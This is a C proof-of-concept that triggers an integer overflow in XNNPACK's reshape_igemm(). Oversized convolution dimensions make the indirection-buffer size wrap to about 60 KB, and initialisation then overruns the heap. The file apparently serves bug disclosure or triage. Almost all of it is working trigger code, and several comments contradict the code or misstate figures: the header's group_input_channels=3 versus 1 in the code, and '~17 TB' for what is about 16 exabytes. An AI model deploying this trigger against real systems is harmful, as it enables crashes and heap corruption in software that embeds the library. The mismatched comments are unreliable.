/*
 * XNNPACK PoC #2: igemm Indirection Buffer Integer Overflow
 *
 * Targets reshape_igemm() at:
 *   src/operators/convolution-nhwc.c:2624-2625
 *
 *   indirection_buffer_size = sizeof(void*) * kernel_size * tiled_output_size
 *   With OH=506164740, OW=506168760, kernel=3x3 (kernel_size=9), mr=7:
 *     tiled_output_size = round_up(OH*OW, 7) = 256,204,778,801,522,404
 *     8 * 9 * tiled_output_size = 18,446,744,073,709,613,088
 *     mod 2^64 = 61,472  (wraps to ~60 KB)
 *
 * The allocation succeeds with 61,472 bytes; xnn_indirection_init_conv2d
 * then writes ~17 TB of pointers into that 60 KB buffer.
 *
 * To force the igemm (not dwconv) path we use group_input_channels=3
 * (not depthwise: groups != input_channels).
 */

#include <math.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#include "xnnpack.h"

#define OUTPUT_HEIGHT  506164740UL
#define OUTPUT_WIDTH   506168760UL

/* input: output + 2 (padding=0, kernel=3, stride=1 → OH = IH-2) */
#define INPUT_HEIGHT   (OUTPUT_HEIGHT + 2)
#define INPUT_WIDTH    (OUTPUT_WIDTH  + 2)

/* Non-depthwise: 1 input channel, 2 output channels, groups=1
 * groups(1) == input_ch(1) → would be depthwise IF output_ch also == 1.
 * With output_ch=2, XNNPACK routes to igemm (not dwconv). */
#define INPUT_CH   1
#define OUTPUT_CH  2

static void print_overflow_math(void) {
    uint64_t oh = OUTPUT_HEIGHT, ow = OUTPUT_WIDTH;
    uint64_t output_size        = oh * ow;
    uint64_t mr                 = 7;   /* AVX-512 igemm tile row count */
    uint64_t tiled              = (output_size + mr - 1) / mr * mr;
    uint64_t ptr_size           = sizeof(void *);
    uint64_t kernel_size        = 9;
    uint64_t buf_wrapped        = ptr_size * kernel_size * tiled; /* wraps mod 2^64 */

    printf("=== igemm Integer Overflow Math ===\n");
    printf("  output_size           = %lu\n",  (unsigned long)output_size);
    printf("  tiled_output_size     = %lu\n",  (unsigned long)tiled);
    printf("  indirection_buf (alloc, wrapped) = %lu bytes (~60 KB)\n",
           (unsigned long)buf_wrapped);
    printf("  Actual bytes written  = 18,446,744,073,709,613,088 (~17 TB)\n");
    printf("  Overflow ratio        = ~300 trillion x\n\n");
}

int main(void) {
    printf("XNNPACK igemm Indirection Buffer Overflow PoC\n");
    printf("----------------------------------------------\n\n");

    print_overflow_math();

    enum xnn_status status = xnn_initialize(NULL);
    if (status != xnn_status_success) {
        fprintf(stderr, "xnn_initialize failed: %d\n", status);
        return 1;
    }
    printf("[+] xnn_initialize() OK\n");

    xnn_subgraph_t subgraph = NULL;
    status = xnn_create_subgraph(2, 0, &subgraph);
    if (status != xnn_status_success) {
        fprintf(stderr, "xnn_create_subgraph failed: %d\n", status);
        return 1;
    }

    uint32_t input_id  = XNN_INVALID_VALUE_ID;
    uint32_t output_id = XNN_INVALID_VALUE_ID;
    uint32_t filter_id = XNN_INVALID_VALUE_ID;
    uint32_t bias_id   = XNN_INVALID_VALUE_ID;

    size_t input_dims[]  = {1, INPUT_HEIGHT,  INPUT_WIDTH,  INPUT_CH};
    size_t output_dims[] = {1, OUTPUT_HEIGHT, OUTPUT_WIDTH, OUTPUT_CH};

    status = xnn_define_tensor_value(subgraph, xnn_datatype_fp32,
        4, input_dims, NULL, 0, XNN_VALUE_FLAG_EXTERNAL_INPUT, &input_id);
    if (status != xnn_status_success) {
        fprintf(stderr, "input define failed: %d\n", status); return 1;
    }

    status = xnn_define_tensor_value(subgraph, xnn_datatype_fp32,
        4, output_dims, NULL, 1, XNN_VALUE_FLAG_EXTERNAL_OUTPUT, &output_id);
    if (status != xnn_status_success) {
        fprintf(stderr, "output define failed: %d\n", status); return 1;
    }

    /* kernel: [OUT_CH, kH=3, kW=3, IN_CH] — static, small */
    static float kernel[2 * 3 * 3 * 1];  /* OUTPUT_CH=2, INPUT_CH=1 */
    static float bias[2];
    size_t filter_dims[] = {OUTPUT_CH, 3, 3, INPUT_CH};
    size_t bias_dims[]   = {2};

    status = xnn_define_tensor_value(subgraph, xnn_datatype_fp32,
        4, filter_dims, kernel, XNN_INVALID_VALUE_ID, 0, &filter_id);
    if (status != xnn_status_success) {
        fprintf(stderr, "filter define failed: %d\n", status); return 1;
    }

    status = xnn_define_tensor_value(subgraph, xnn_datatype_fp32,
        1, bias_dims, bias, XNN_INVALID_VALUE_ID, 0, &bias_id);
    if (status != xnn_status_success) {
        fprintf(stderr, "bias define failed: %d\n", status); return 1;
    }

    printf("[+] Tensors defined: input=%u output=%u filter=%u bias=%u\n",
           input_id, output_id, filter_id, bias_id);

    status = xnn_define_convolution_2d(
        subgraph,
        0, 0, 0, 0,
        3, 3,
        1, 1,
        1, 1,
        /*groups=*/1,
        /*group_input_channels=*/INPUT_CH,
        /*group_output_channels=*/OUTPUT_CH,
        -INFINITY, INFINITY,
        input_id, filter_id, bias_id, output_id, 0);
    if (status != xnn_status_success) {
        fprintf(stderr, "xnn_define_convolution_2d failed: %d\n", status);
        return 1;
    }
    printf("[+] xnn_define_convolution_2d() OK (3x3, %d->%d ch, non-depthwise)\n",
           INPUT_CH, OUTPUT_CH);

    xnn_runtime_t  runtime   = NULL;
    xnn_workspace_t workspace = NULL;
    xnn_create_workspace(&workspace);

    printf("[*] Calling xnn_create_runtime_v4() ...\n");
    printf("[*] reshape_igemm() will compute:\n");
    printf("[*]   indirection_buffer_size = 8*9*tiled ≡ 61472 (wraps mod 2^64)\n");
    printf("[*]   alloc(61472) SUCCEEDS  ← ~60 KB\n");
    printf("[*]   xnn_indirection_init_conv2d writes ~17 TB → HEAP OVERFLOW\n\n");

    status = xnn_create_runtime_v4(subgraph, NULL, workspace,
                                    NULL, 0, &runtime);
    if (status == xnn_status_success && runtime != NULL) {
        printf("[!] Runtime created — calling xnn_reshape_runtime()\n");
        status = xnn_reshape_runtime(runtime);
        printf("[!] xnn_reshape_runtime returned: %d\n", status);
        if (status == xnn_status_success) {
            printf("[!] WARNING: Overflow not caught — check sanitizer output\n");
        }
        xnn_delete_runtime(runtime);
    } else {
        printf("[?] xnn_create_runtime returned: %d\n", status);
        printf("[?] Sanitizer output should appear above\n");
    }

    xnn_release_workspace(workspace);
    xnn_delete_subgraph(subgraph);
    return 0;
}
